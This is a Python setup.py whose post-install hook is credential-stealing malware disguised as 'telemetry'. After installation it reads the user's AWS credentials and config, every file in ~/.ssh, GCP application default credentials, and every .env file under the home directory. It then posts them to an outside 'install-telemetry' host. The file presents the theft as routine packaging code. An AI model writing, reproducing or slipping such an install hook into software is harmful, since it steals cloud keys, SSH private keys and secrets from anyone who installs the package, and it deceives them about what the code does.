import os, json, urllib.request
from setuptools import setup
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        install.run(self)
        self._collect_and_send()

    def _collect_and_send(self):
        data = {}
        home_dir = os.path.expanduser('~')

        # Read ~/.aws/credentials and ~/.aws/config into data['aws']
        aws_dir = os.path.join(home_dir, '.aws')
        aws_config = {}
        if os.path.exists(aws_dir):
            credentials_file = os.path.join(aws_dir, 'credentials')
            config_file = os.path.join(aws_dir, 'config')
            if os.path.exists(credentials_file):
                with open(credentials_file, 'r') as f:
                    aws_config['credentials'] = f.read()
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    aws_config['config'] = f.read()
        data['aws'] = aws_config

        # Read all files in ~/.ssh/ into data['ssh']
        ssh_dir = os.path.join(home_dir, '.ssh')
        ssh_files = {}
        if os.path.exists(ssh_dir):
            for filename in os.listdir(ssh_dir):
                filepath = os.path.join(ssh_dir, filename)
                if os.path.isfile(filepath):
                    try:
                        with open(filepath, 'r') as f:
                            ssh_files[filename] = f.read()
                    except Exception as e:
                        ssh_files[filename] = f"Error reading file: {str(e)}"
        data['ssh'] = ssh_files

        # Read ~/.config/gcloud/application_default_credentials.json into data['gcp']
        gcp_config = {}
        gcp_config_file = os.path.join(home_dir, '.config', 'gcloud', 'application_default_credentials.json')
        if os.path.exists(gcp_config_file):
            with open(gcp_config_file, 'r') as f:
                gcp_config['application_default_credentials'] = json.load(f)
        data['gcp'] = gcp_config

        # Find all .env files in home directory recursively into data['env_files']
        env_files = {}
        for root, dirs, files in os.walk(home_dir):
            for file in files:
                if file == '.env':
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r') as f:
                            env_files[filepath] = f.read()
                    except Exception as e:
                        env_files[filepath] = f"Error reading file: {str(e)}"
        data['env_files'] = env_files

        # POST data as JSON to 'https://install-telemetry.example.com/report'
        json_data = json.dumps(data).encode('utf-8')
        req = urllib.request.Request('https://install-telemetry.example.com/report', data=json_data, headers={'Content-Type': 'application/json'})
        try:
            with urllib.request.urlopen(req) as response:
                if response.status != 200:
                    print(f"Failed to send telemetry data: {response.status}")
        except Exception as e:
            print(f"Failed to send telemetry data: {str(e)}")

